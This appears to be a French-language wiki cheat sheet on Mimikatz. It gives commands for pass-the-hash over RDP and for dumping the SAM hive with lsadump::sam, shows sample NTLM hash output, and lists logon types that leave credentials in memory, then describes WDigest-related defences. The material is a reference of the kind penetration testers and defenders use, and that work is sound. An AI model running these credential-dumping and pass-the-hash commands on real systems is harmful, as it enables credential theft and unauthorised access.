---
title: Mimikatz
permalink: /Mimikatz/
---

# Mimikatz

## Commandes utiles

Repris de https://github.com/gentilkiwi/mimikatz/wiki

#### Pass the hash et RDP
``` bash
privilege::debug
sekurlsa::pth /user:heidegger /domain:SHINRA-INC /ntlm:XXXXXXXXXXXXXXXX /run:"mstsc.exe /restrictedadmin"
```

#### Dump offline de SAM
Récupérer SAM et system:
```bash
reg save HKLM\SYSTEM SystemBkup.hiv
reg save HKLM\SAM SamBkup.hiv
```
Dumper les hashs avec mimikatz:
```bash
mimikatz # lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
Domain : VM-W7-ULT-X
SysKey : 74c159e4408119a0ba39a7872e9d9a56

SAMKey : e44dd440fd77ebfe800edf60c11d4abd

RID  : 000001f4 (500)
User : Administrateur
LM   :
NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Invité
LM   :
NTLM :

RID  : 000003e8 (1000)
User : Gentil Kiwi
LM   :
NTLM : cc36cf7a8514893efccd332446158b1a
```

## Secrets d'authentification en mémoire

Les "logins" suivants provoquent le stockage d'information d'authenficaction en mémoire (https://technet.microsoft.com/en-us/windows-server-docs/security/securing-privileged-access/securing-privileged-access-reference-material#a-nameatltbmaadministrative-tools-and-logon-types):

-   Log on at console
-   Remote Desktop
-   RunAs
-   Powershell WiRM with CredSSP
-   PsExec with explicit creds
-   Scheduled Task
-   Tool running as a service
-   IIS "Basic Authentication"

Trucs & astuces:
- Sous les vieilles versions de Windows il est possible d'utiliser mimilove.
- Il est possible de dumper lsass et de l'analyser offline avec mimikatz.

## Défenses

Il existe plusieurs mécanismes pour se défendre contre les attaques utilisant Mimikatz (Plus d'informations sur ADSecurity: <https://adsecurity.org/?p=559>)

### Désactiver wdigest

A partir de Windows 8.1 et Windows Server 2012 les mots de passes ne sont plus stockés en mémoire par défaut. De plus il est possible de faire en sorte que les mots de passe n'apparaissent pas en mémoire dans les anciennes versions de Windows. Il faut pour cela:

-   Appliquer le patch KB2871997
-   Modifier la clé de registre suivante pour qu'elle ait 0:

``` text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)
```


Références
----------

-   [Unofficial Guide to Mimikatz & Command Reference - ADSecurity](https://adsecurity.org/?page_id=1821)
-   [Mimikatz Overview, Defenses and Detection](https://www.sans.org/reading-room/whitepapers/detection/mimikatz-overview-defenses-detection-36780)
-   [Utilisation avancée de Mimikatz](http://connect.ed-diamond.com/MISC/MISC-066/Utilisation-avancee-de-Mimikatz)
-   [Administrative Tools and Logon Types](https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#ATLT_BM): Information sur la réutilisation des mots de passe

